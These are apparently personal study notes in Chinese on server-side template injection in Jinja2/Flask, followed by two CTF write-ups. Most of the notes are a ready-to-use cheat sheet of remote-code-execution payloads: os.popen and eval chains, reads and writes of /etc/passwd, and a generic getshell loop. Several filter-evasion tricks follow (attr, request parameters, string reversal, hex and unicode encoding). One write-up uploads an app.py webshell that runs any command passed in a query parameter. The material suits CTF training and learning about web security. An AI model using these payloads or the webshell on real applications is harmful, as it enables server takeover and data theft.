# 学习笔记
## SSTI模板注入的检测
<font style="color:rgb(77, 77, 77);">发送类似下面的</font><font style="color:rgb(78, 161, 219) !important;">payload</font><font style="color:rgb(77, 77, 77);">，不同模板语法有一些差异</font>

```php
smarty=Hello ${7*7}
Hello 49
twig=Hello {{7*7}}
Hello 49
```

<font style="color:rgb(77, 77, 77);">检测到模板注入漏洞后，需要准确识别模板引擎的类型。神器Burpsuite 自带检测功能，并对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737868393845-e55dd636-cd32-4c34-8df8-36500343ced7.png)

## <font style="color:#000000;">SSTI模板注入思路</font>
<font style="color:rgb(77, 77, 77);">获取内置类所对应的类</font>

```php
(__class__)
```

<font style="color:rgb(77, 77, 77);">拿到object基类（面向对象都有一个基类</font>

```php
__bases__<class 'object'>
```

<font style="color:rgb(77, 77, 77);">获取子类列表</font>

```php
__subclasses__()
```

<font style="color:rgb(77, 77, 77);">在子类中找到可以getshell的类</font>

## SSTI模板注入漏洞常用payload
### 无过滤情况
<font style="color:rgb(77, 77, 77);">1、直接使用system、cat等命令进行远程代码执行</font>

<font style="color:rgb(77, 77, 77);">2、使用</font>

```php
\#**简单查找具体python类的索引：**
import os
print(''.__class__.__bases__[0].__subclasses__().index(os._wrap_close))


\#读取config
如果flag写入config内，那么可以直接{{config}}查看或者{{self.dict._TemplateReference__context.config}}

\#读取文件类，<type ‘file’> file位置一般为40，直接调用
{{[].__class__.__base__.__subclasses__()[40]('flag').read()}} 
{{[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()}}
{{[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()}}
{{[].__class__.__base__.__subclasses__()[257]('flag').read()}} (python3)

\#直接使用popen命令，python2是非法的，只限于python3
！！！！！！！！
**os._wrap_close** 类里有popen和builtins,一般位置为132~139附近
<class ‘site._Printer’> 调用os的popen执行命令
<class ‘warnings.catch_warnings’>一般位置为59，可以用它来调用file、os、eval、commands等


{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}


\#调用os的popen执行命令
\#python2、python3通用
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls /flag').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat /flag').read()}}
{{''.__class__.__base__.__subclasses__()[185].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}
\#python3专属
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['os'].popen('ls /').read()}}


\#调用eval函数读取
\#python2
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}} 
{{"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')}}
{{"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')}}
{{"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')}}
\#python3
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}} 
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']}}
{{"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}


\#调用 importlib类
{{''.__class__.__base__.__subclasses__()[128]["load_module"]("os")["popen"]("ls /").read()}}


\#调用linecache函数
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}


\#调用communicate()函数
{{''.__class__.__base__.__subclasses__()[128]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}


\#写文件
写文件的话就直接把上面的构造里的read()换成write()即可，下面举例利用file类将数据写入文件。
{{"".__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/tmp').write('test')}}  ----python2的str类型不直接从属于基类，所以payload中含有两个 .__bases__
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').write('123456')}}


\#通用 getshell
原理：找到含有 __builtins__ 的类，利用即可。
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

```

### 有过滤情况
#### 绕过[]
```php
1、使用__getitem__绕过
{{().__class__.__bases__[0]}}
可替换为
{{().__class__.__bases__.__getitem__(0)}}
```

#### 利用{%%}绕过{{}}
<font style="color:rgb(77, 77, 77);">尝试{%%}，想回显内容在外面加个print就行</font>

```php
{%print("".__class__)%}
```

#### 绕过.
使用中括号[]绕过

```php
{{().__class__}} 
可替换为:
{{()["__class__"]}}

举例：
{{()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()}}
```

使用attr()绕过

```php
attr()函数是Python内置函数之一，用于获取对象的属性值或设置属性值。它可以用于任何具有属性的对象，例如类实例、模块、函数等。

{{().__class__}} 
可替换为：
{{()|attr("__class__")}}
{{getattr('',"__class__")}}

举例：
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')}}

```

#### 利用request绕过单双引号过滤和关键字过滤
<font style="color:rgb(77, 77, 77);">如果对我们特定的参数进行了严格的过滤，我们就可以使用request来进行绕过</font>

<font style="color:rgb(77, 77, 77);">常用的request绕过payload</font>

```php
request.args.key  #获取get传入的key的值

request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)

reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get

request.cookies.key  #获取cookies传入参数

request.headers.key  #获取请求头请求参数

request.data  #获取post传入参数(Content-Type:a/b)

request.json  #获取post传入json参数 (Content-Type: application/json)

```

例如如果过滤了单引号

```php
{{[].__class__.__base__.__subclasses__().__gititem__(117).__init__.__globals__.__gititem__('popen')('cat /etc/passwd').read()}}
等价于
{{[].__class__.__base__.__subclasses__().__gititem__(117).__init__.__globals__.__gititem__(request.args.key1)(request.args.key2).read()}}
//get方式传入参数  key1=popen  key2=cat /etc/passwd
```

同样过滤了特定关键字也可以通过request方法绕过过滤

#### 关键字绕过过滤
##### 1、拼接
```php
"class"
等价于
"cla"+"ss"
//在jinjia2里面，"cla""ss"是等同于"class"的
```

##### 2、反转
```php
"__class__"
等价于
"__ssalc__"[::-1]
```

##### <font style="color:rgb(77, 77, 77);">3、ascii转换</font>
```php
"{0:c}".format(97)='a'
"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)='__class__'
```

##### 4、编码绕过
```php
"__class__"=="\x5f\x5fclass\x5f\x5f"=="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"
对于python2的话，还可以利用base64进行绕过
"__class__"==("X19jbGFzc19f").decode("base64")
```

##### 5、过滤器绕过（reverse，replace，join）
**过滤器reverse**

```php
{{()[‘__class__’]}}等价于{%set a=”__ssalc__”|reverse%}{{()[a]}}
```

payload可以这么构造：

```php
{%set a=”__ssalc__”|reverse%}{%set b="__esab__"|reverse%}{%set c=”__sessalcbus__”|reverse%}{%set d="__ tini__"|reverse%}{%set e=”__slabolg__”|reverse%}{%set f=”nepop”|reverse%}{{""[a][b][c]()[199][d][e][‘os’][f](‘ls’)[‘read’]()}}
```

**过滤器replace**

```php
{{()[‘__class__’]}}等价于{%set a=”__claee__”|replace("ee","ss")%}{{()[a]}}
```

**过滤器join**

```php
{%set a=dict(__cla=a,ss__=a)|join%}{{()[a]}}

(%set a=[‘__cla’,’ss__’]|join%}{{()[a]}}

```

# 做题WP
## <font style="color:rgb(33, 37, 41);">[NewStarCTF 2023 公开赛道]flask disk</font>
打开靶机发现存在三个页面

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737870762620-2c6e8666-fd53-4698-b122-6190e0536f04.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737870788926-12d4c5ca-2efe-4b03-86a8-d57c3557f19d.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737870802218-b29bfb8c-7744-41aa-94ae-699e02a0b52b.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737870812033-9b410cb0-7a9d-41ea-a2ce-46bc56f4ae4b.png)

访问admin manage发现要输入pin码，说明flask开启了debug模式。flask开启了debug模式下，app.py源文件被修改后会立刻加载。所以只需要上传一个能rce的app.py文件把原来的覆盖，就可以了

```php
from flask import Flask, request
import os
app = Flask(__name__)
@app.route('/')
def index():
    try:
        m = request.args.get('cmd')
        d = os.popen(m).read()
        return d
    except:
        pass
    return "1"
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737870898831-574cdb4b-4bda-409b-986b-e681fd51aee8.png)

上传成功后 输入命令执行语句

```php
?cmd=ls /
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737870944436-24373b01-f4a0-45d8-aeec-249a238e0ac5.png)

发现flag 接着读取flag

```php
?cmd=cat /flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737870999881-c22186c2-8c9b-44ae-8b45-ce06b6025c8b.png)

接着得到flag

## [安洵杯 2020]Normal SSTI
打开靶机题目提示前往test目录

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737873325031-7c869d34-a447-4703-a4b6-8baaeec3aaab.png)

前往test目录后发生页面跳转 根据题目提示存在ssti注入 并且存在过滤

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737873471711-8c30d8e4-a79e-482a-a7a8-1cbd8046c486.png)

先尝试输入

```php
?url={{2*2}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737873768083-1a82c425-5c96-4a2a-95fb-022bc37407b0.png)

发现{{}}可能被过滤了 利用{%print()%}替代 接着

```php
?url={%print(''.__class__)%}
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737873889661-f54597d7-dbfa-43a3-99dc-c031e1b55152.png)

接着还是被过滤 于是尝试用Unicode编码绕过

```php
?url={%print(()|attr(%22\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f%22))%}
等价于
?url={{''.__class__}}
```

发现得到回显

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737874075207-8a918def-6bde-4ef3-9bd0-20153919361d.png)

接着找os模块

```php
?url={%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))%}
等价于
?url={{lipsum.__globals__}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737874320953-66588065-c1a8-4de6-afc8-f2401ad3ec35.png)

<font style="color:rgb(77, 77, 77);">引用popen，查目录</font>

```php
?url={%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22)|attr(%22\u0067\u0065\u0074%22)(%22os%22)|attr(%22\u0070\u006f\u0070\u0065\u006e%22)(%22\u006c\u0073\u0020\u002f%22)|attr(%22\u0072\u0065\u0061\u0064%22)())%}
等价于
?url={{lipsum.__globals__.get("os").popen("ls").read()}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737874478070-c0d5fa8f-057b-4c30-a611-c0fd59d1973c.png)

最后读取flag

```php
?url={%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22)|attr(%22\u0067\u0065\u0074%22)(%22os%22)|attr(%22\u0070\u006f\u0070\u0065\u006e%22)(%22\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067%22)|attr(%22\u0072\u0065\u0061\u0064%22)())%}
等于
?url={{config.__class__.__init__.__globals__.get(“os”).popen('cat flag').read()}}
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737874719136-ad0834d6-f7a6-4982-a364-87c44c55ac50.png)

